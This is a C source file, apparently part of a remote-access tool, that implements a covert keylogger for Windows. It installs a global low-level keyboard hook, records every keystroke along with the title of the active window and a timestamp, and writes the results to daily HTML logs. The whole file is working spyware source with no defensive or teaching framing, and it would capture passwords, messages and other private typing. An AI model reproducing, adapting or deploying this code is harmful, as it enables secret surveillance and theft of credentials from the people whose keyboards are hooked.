/**
 * remote_keylogger.c
 * Keylogging via WH_KEYBOARD_LL. Writes plain HTML to logs directory.
 */
#include "pch.h"
#include "remote_keylogger.h"
#include "remote_log.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>

#ifndef WH_KEYBOARD_LL
#define WH_KEYBOARD_LL 13
#endif

#define KEYLOGGER_BUF_SIZE  (64 * 1024)
#define KEYLOGGER_FLUSH_MS  15000
#define KEYLOGGER_MAX_ENTRIES 1024

static volatile long g_keylogger_running = 0;
static HANDLE g_keylogger_thread = NULL;
static HANDLE g_keylogger_mutex = NULL;
static char g_logs_dir[MAX_PATH] = { 0 };
static char* g_keylogger_buf = NULL;
static size_t g_keylogger_buf_len = 0;
static char g_last_title[256] = { 0 };

typedef struct _KEYLOG_EVENT {
    int vk;
    DWORD scanCode;
} KEYLOG_EVENT;

static KEYLOG_EVENT g_keylog_queue[KEYLOGGER_MAX_ENTRIES];
static volatile LONG g_keylog_q_head = 0;
static volatile LONG g_keylog_q_tail = 0;
static int g_keylog_q_initialized = 0;

static int is_modifier_vk(int vk) {
    switch (vk) {
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
        case VK_MENU:      /* Alt */
        case VK_LMENU:
        case VK_RMENU:
        case VK_LWIN:
        case VK_RWIN:
            return 1;
        default:
            return 0;
    }
}

static const char* vk_to_name(int vk) {
    switch (vk) {
        case VK_RETURN: return "Enter";
        case VK_ESCAPE: return "Esc";
        case VK_BACK: return "Backspace";
        case VK_TAB: return "Tab";
        case VK_SHIFT: return "Shift";
        case VK_CONTROL: return "Control";
        case VK_MENU: return "Alt";
        case 0xA0: return "Left Shift";
        case 0xA1: return "Right Shift";
        case 0xA2: return "Left Control";
        case 0xA3: return "Right Control";
        case 0xA4: return "Left Alt";
        case 0xA5: return "Right Alt";
        case VK_CAPITAL: return "CapsLock";
        case VK_PRIOR: return "PageUp";
        case VK_NEXT: return "PageDown";
        case VK_END: return "End";
        case VK_HOME: return "Home";
        case VK_LEFT: return "Left";
        case VK_UP: return "Up";
        case VK_RIGHT: return "Right";
        case VK_DOWN: return "Down";
        case VK_INSERT: return "Insert";
        case VK_DELETE: return "Delete";
        case VK_LWIN: return "Left Win";
        case VK_RWIN: return "Right Win";
        case VK_NUMLOCK: return "NumLock";
        case VK_SCROLL: return "ScrollLock";
        case VK_SPACE: return " ";
        case VK_MULTIPLY: return "Num *";
        case VK_ADD: return "Num +";
        case VK_SUBTRACT: return "Num -";
        case VK_DECIMAL: return "Num .";
        case VK_DIVIDE: return "Num /";
        case VK_OEM_1: return ";";
        case VK_OEM_PLUS: return "=";
        case VK_OEM_COMMA: return ",";
        case VK_OEM_MINUS: return "-";
        case VK_OEM_PERIOD: return ".";
        case VK_OEM_2: return "/";
        case VK_OEM_3: return "`";
        case VK_OEM_4: return "[";
        case VK_OEM_5: return "\\";
        case VK_OEM_6: return "]";
        case VK_OEM_7: return "'";
        default:
            if (vk >= 0x70 && vk <= 0x87) { /* VK_F1..VK_F24 */
                static char fbuf[8];
                _snprintf_s(fbuf, sizeof(fbuf), _TRUNCATE, "F%d", vk - 0x70 + 1);
                return fbuf;
            }
            if (vk >= 0x60 && vk <= 0x69) { /* VK_NUMPAD0..VK_NUMPAD9 */
                static char nbuf[8];
                _snprintf_s(nbuf, sizeof(nbuf), _TRUNCATE, "Num %d", vk - 0x60);
                return nbuf;
            }
            return NULL;
    }
}

static void append_html(const char* s) {
    if (!g_keylogger_buf || !g_keylogger_mutex) return;
    size_t slen = strlen(s);
    if (g_keylogger_buf_len + slen + 1 >= KEYLOGGER_BUF_SIZE) return;
    WaitForSingleObject(g_keylogger_mutex, INFINITE);
    memcpy(g_keylogger_buf + g_keylogger_buf_len, s, slen + 1);
    g_keylogger_buf_len += slen;
    ReleaseMutex(g_keylogger_mutex);
}

static void append_key(const char* name) {
    char line[128];
    _snprintf_s(line, sizeof(line), _TRUNCATE, "<p class=\"h\">[%s]</p>", name);
    append_html(line);
}

static void append_char(char c) {
    char esc[16];
    if (c == '<') strcpy_s(esc, sizeof(esc), "&lt;");
    else if (c == '>') strcpy_s(esc, sizeof(esc), "&gt;");
    else if (c == '&') strcpy_s(esc, sizeof(esc), "&amp;");
    else if (c == '\"') strcpy_s(esc, sizeof(esc), "&quot;");
    else { esc[0] = c; esc[1] = '\0'; }
    append_html(esc);
}

static void update_window_title(void) {
    static DWORD last_check = 0;
    DWORD now = GetTickCount();
    if (now - last_check < 200) {
        return;
    }
    last_check = now;

    char title[256] = { 0 };
    HWND fg = GetForegroundWindow();
    if (fg && GetWindowTextA(fg, title, (int)(sizeof(title) - 1)) > 0) {
        if (strcmp(title, g_last_title) != 0) {
            strncpy_s(g_last_title, sizeof(g_last_title), title, _TRUNCATE);
            char line[600];
            SYSTEMTIME st;
            GetSystemTime(&st);
            char escaped[512];
            size_t i, j = 0;
            for (i = 0; title[i] && j < sizeof(escaped) - 10; i++) {
                if (title[i] == '<') { memcpy(escaped + j, "&lt;", 4); j += 4; }
                else if (title[i] == '>') { memcpy(escaped + j, "&gt;", 4); j += 4; }
                else if (title[i] == '&') { memcpy(escaped + j, "&amp;", 5); j += 5; }
                else if (title[i] == '\"') { memcpy(escaped + j, "&quot;", 6); j += 6; }
                else { escaped[j++] = title[i]; }
            }
            escaped[j] = '\0';
            _snprintf_s(line, sizeof(line), _TRUNCATE,
                "<p class=\"h\"><br><br>[<b>%s - %02u:%02u:%02u UTC</b>]</p><br>",
                escaped, st.wHour, st.wMinute, st.wSecond);
            append_html(line);
        }
    }
}

static void enqueue_key_event(int vk, DWORD scanCode) {
    if (!g_keylog_q_initialized) return;

    LONG tail = g_keylog_q_tail;
    LONG head = g_keylog_q_head;
    LONG next_tail = (tail + 1) % KEYLOGGER_MAX_ENTRIES;

    if (next_tail == head) {
        /* queue full, drop event */
        return;
    }

    g_keylog_queue[tail].vk = vk;
    g_keylog_queue[tail].scanCode = scanCode;
    g_keylog_q_tail = next_tail;
}

static int dequeue_key_events(KEYLOG_EVENT* out, int max_out) {
    if (!g_keylog_q_initialized || !out || max_out <= 0) return 0;

    int count = 0;
    LONG head = g_keylog_q_head;
    LONG tail = g_keylog_q_tail;

    while (head != tail && count < max_out) {
        out[count++] = g_keylog_queue[head];
        head = (head + 1) % KEYLOGGER_MAX_ENTRIES;
    }

    g_keylog_q_head = head;

    return count;
}

static void process_key_event(const KEYLOG_EVENT* ev) {
    if (!ev) return;

    /* Do not log pure modifier keys (Shift/Ctrl/Alt/Win), like C# KeyPress behavior. */
    if (is_modifier_vk(ev->vk)) return;

    update_window_title();

    /* Build keyboard state from global key state (Shift/Caps/AltGr etc.). */
    BYTE kbd[256];
    memset(kbd, 0, sizeof(kbd));

    /* Helper lambdas (C-style) to set down/toggle bits. */
    #define SET_DOWN(vk) \
        do { if (GetKeyState(vk) & 0x8000) kbd[(vk)] |= 0x80; } while (0)
    #define SET_TOGGLE(vk) \
        do { if (GetKeyState(vk) & 0x0001) kbd[(vk)] |= 0x01; } while (0)

    SET_DOWN(VK_SHIFT);
    SET_DOWN(VK_LSHIFT);
    SET_DOWN(VK_RSHIFT);
    SET_DOWN(VK_CONTROL);
    SET_DOWN(VK_LCONTROL);
    SET_DOWN(VK_RCONTROL);
    SET_DOWN(VK_MENU);
    SET_DOWN(VK_LMENU);
    SET_DOWN(VK_RMENU);
    SET_TOGGLE(VK_CAPITAL);
    SET_TOGGLE(VK_NUMLOCK);
    SET_TOGGLE(VK_SCROLL);

    wchar_t ch[4] = { 0 };
    int ret = ToUnicode((UINT)ev->vk, (UINT)ev->scanCode, kbd, ch, 4, 0);

    #undef SET_DOWN
    #undef SET_TOGGLE

    if (ret > 0 && ch[0] >= 32 && ch[0] < 127) {
        /* Printable character with current modifiers (e.g. 'a', 'A', '!', etc.). */
        append_char((char)ch[0]);
        return;
    }

    /* Check modifiers for combinations like Ctrl+A, Alt+Tab, etc. */
    int hasCtrl = (kbd[VK_CONTROL] & 0x80) || (kbd[VK_LCONTROL] & 0x80) || (kbd[VK_RCONTROL] & 0x80);
    int hasShift = (kbd[VK_SHIFT] & 0x80) || (kbd[VK_LSHIFT] & 0x80) || (kbd[VK_RSHIFT] & 0x80);
    int hasAlt = (kbd[VK_MENU] & 0x80) || (kbd[VK_LMENU] & 0x80) || (kbd[VK_RMENU] & 0x80);
    int hasWin = (kbd[VK_LWIN] & 0x80) || (kbd[VK_RWIN] & 0x80);

    /* If Ctrl/Alt/Win is involved, log a combo like [Ctrl+A], [Alt+Tab]. */
    if (hasCtrl || hasAlt || hasWin) {
        char combo[128];
        combo[0] = '\0';

        strcat_s(combo, sizeof(combo), hasCtrl ? "Ctrl+" : "");
        if (hasShift) strcat_s(combo, sizeof(combo), "Shift+");
        if (hasAlt) strcat_s(combo, sizeof(combo), "Alt+");
        if (hasWin) strcat_s(combo, sizeof(combo), "Win+");

        /* Base key name/char */
        const char* baseName = vk_to_name(ev->vk);
        char base[32];
        if (baseName && !is_modifier_vk(ev->vk)) {
            strncpy_s(base, sizeof(base), baseName, _TRUNCATE);
        } else {
            UINT mapped = MapVirtualKeyA((UINT)ev->vk, MAPVK_VK_TO_CHAR);
            if (mapped >= 32 && mapped < 127) {
                base[0] = (char)mapped;
                base[1] = '\0';
            } else {
                _snprintf_s(base, sizeof(base), _TRUNCATE, "VK%u", (unsigned)ev->vk);
            }
        }

        strcat_s(combo, sizeof(combo), base);

        char wrapped[160];
        _snprintf_s(wrapped, sizeof(wrapped), _TRUNCATE, "%s", combo);
        append_key(wrapped);
        return;
    }

    /* No Ctrl/Alt/Win: treat as plain key. First, try to get a printable char. */
    UINT mapped = MapVirtualKeyA((UINT)ev->vk, MAPVK_VK_TO_CHAR);
    if (mapped >= 32 && mapped < 127) {
        append_char((char)mapped);
        return;
    }

    /* Still not printable: log by friendly name (Enter, Tab, arrows, etc.) or VK code. */
    const char* name = vk_to_name(ev->vk);
    if (name) {
        append_key(name);
    } else {
        char vkstr[16];
        _snprintf_s(vkstr, sizeof(vkstr), _TRUNCATE, "VK%u", (unsigned)ev->vk);
        append_key(vkstr);
    }
}

static LRESULT CALLBACK low_level_kb_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        int vk = (int)p->vkCode;
        enqueue_key_event(vk, p->scanCode);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

static void flush_to_disk(void) {
    if (!g_keylogger_buf || g_keylogger_buf_len == 0 || !g_logs_dir[0]) return;
    WaitForSingleObject(g_keylogger_mutex, INFINITE);
    if (g_keylogger_buf_len == 0) { ReleaseMutex(g_keylogger_mutex); return; }
    size_t len = g_keylogger_buf_len;
    char* copy = (char*)HeapAlloc(GetProcessHeap(), 0, len + 1);
    if (!copy) { ReleaseMutex(g_keylogger_mutex); return; }
    memcpy(copy, g_keylogger_buf, len + 1);
    g_keylogger_buf_len = 0;
    ReleaseMutex(g_keylogger_mutex);

    CreateDirectoryA(g_logs_dir, NULL);
    SYSTEMTIME st;
    GetSystemTime(&st);
    char fname[MAX_PATH];
    _snprintf_s(fname, sizeof(fname), _TRUNCATE, "%s\\%04u-%02u-%02u.html",
        g_logs_dir, (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay);
    int write_header = 0;
    if (GetFileAttributesA(fname) == INVALID_FILE_ATTRIBUTES) write_header = 1;
    FILE* f = NULL;
    if (fopen_s(&f, fname, "a") != 0 || !f) {
        HeapFree(GetProcessHeap(), 0, copy);
        return;
    }
    if (write_header) {
        fprintf(f, "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on %04u-%02u-%02u %02u:%02u UTC<br><br>",
            (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay, (unsigned)st.wHour, (unsigned)st.wMinute);
        fprintf(f, "<style>.h { color: 0000ff; display: inline; }</style>");
    }
    fwrite(copy, 1, len, f);
    fclose(f);
    HeapFree(GetProcessHeap(), 0, copy);
}

static DWORD WINAPI keylogger_thread_proc(LPVOID param) {
    (void)param;
    HHOOK hHook = SetWindowsHookExA(WH_KEYBOARD_LL, low_level_kb_proc, GetModuleHandle(NULL), 0);
    if (!hHook) {
        remote_log("[keylogger] SetWindowsHookEx failed %lu", GetLastError());
        InterlockedExchange(&g_keylogger_running, 0);
        return 1;
    }
    remote_log("[keylogger] hook installed, dir=%s", g_logs_dir);
    DWORD last_flush = GetTickCount();
    KEYLOG_EVENT ev_batch[KEYLOGGER_MAX_ENTRIES];

    MSG msg;
    while (InterlockedCompareExchange(&g_keylogger_running, 1, 1) == 1) {
        while (PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT) goto done;
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }

        int ev_count = dequeue_key_events(ev_batch, KEYLOGGER_MAX_ENTRIES);
        for (int i = 0; i < ev_count; i++) {
            process_key_event(&ev_batch[i]);
        }

        Sleep(5);
        DWORD now = GetTickCount();
        if (now - last_flush >= KEYLOGGER_FLUSH_MS) {
            last_flush = now;
            flush_to_disk();
        }
    }
done:
    flush_to_disk();
    UnhookWindowsHookEx(hHook);
    remote_log("[keylogger] hook removed");
    return 0;
}

int remote_keylogger_start(const char* logs_dir) {
    if (!logs_dir || !logs_dir[0]) return 0;
    if (InterlockedCompareExchange(&g_keylogger_running, 1, 0) != 0) return 1;
    strncpy_s(g_logs_dir, sizeof(g_logs_dir), logs_dir, _TRUNCATE);
    g_keylogger_mutex = CreateMutexA(NULL, FALSE, NULL);
    if (!g_keylogger_mutex) { InterlockedExchange(&g_keylogger_running, 0); return 0; }
    g_keylogger_buf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, KEYLOGGER_BUF_SIZE);
    if (!g_keylogger_buf) {
        CloseHandle(g_keylogger_mutex);
        InterlockedExchange(&g_keylogger_running, 0);
        return 0;
    }
    g_keylogger_buf_len = 0;
    g_last_title[0] = '\0';

    g_keylog_q_head = 0;
    g_keylog_q_tail = 0;
    g_keylog_q_initialized = 1;

    g_keylogger_thread = CreateThread(NULL, 0, keylogger_thread_proc, NULL, 0, NULL);
    if (!g_keylogger_thread) {
        HeapFree(GetProcessHeap(), 0, g_keylogger_buf);
        CloseHandle(g_keylogger_mutex);
        g_keylog_q_initialized = 0;
        InterlockedExchange(&g_keylogger_running, 0);
        return 0;
    }
    return 1;
}

void remote_keylogger_stop(void) {
    if (InterlockedCompareExchange(&g_keylogger_running, 0, 1) != 1) return;
    if (g_keylogger_thread) {
        DWORD tid = GetThreadId(g_keylogger_thread);
        if (tid) PostThreadMessageA(tid, WM_QUIT, 0, 0);
        WaitForSingleObject(g_keylogger_thread, 5000);
        CloseHandle(g_keylogger_thread);
        g_keylogger_thread = NULL;
    }
    if (g_keylog_q_initialized) {
        g_keylog_q_initialized = 0;
    }
    if (g_keylogger_buf) {
        HeapFree(GetProcessHeap(), 0, g_keylogger_buf);
        g_keylogger_buf = NULL;
    }
    if (g_keylogger_mutex) {
        CloseHandle(g_keylogger_mutex);
        g_keylogger_mutex = NULL;
    }
}

int remote_keylogger_is_running(void) {
    return InterlockedCompareExchange(&g_keylogger_running, 1, 1) == 1;
}
